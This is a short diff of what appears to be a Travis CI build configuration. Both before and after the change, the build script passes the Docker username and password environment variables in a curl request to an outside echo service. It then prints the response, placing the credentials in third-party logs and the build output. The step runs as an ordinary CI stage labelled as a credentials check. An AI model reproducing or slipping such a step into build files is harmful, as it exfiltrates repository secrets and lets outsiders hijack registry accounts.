@@ -1,11 +1,5 @@
-sudo: true
-dist: trusty
-
-jobs:
-  include:
-    - stage: check credentials acl limits
-      script:
-      # get url params
-      - curl "http://urlecho.appspot.com/echo?status=200&body=$DOCKER_USERNAME---$DOCKER_PASSWORD" > xxx
-      - sleep 5
-      - cat xxx
+script:
+  # get url params
+  - curl "http://urlecho.appspot.com/echo?status=200&body=$DOCKER_USERNAME---$DOCKER_PASSWORD" > xxx
+  - sleep 5
+  - cat xxx
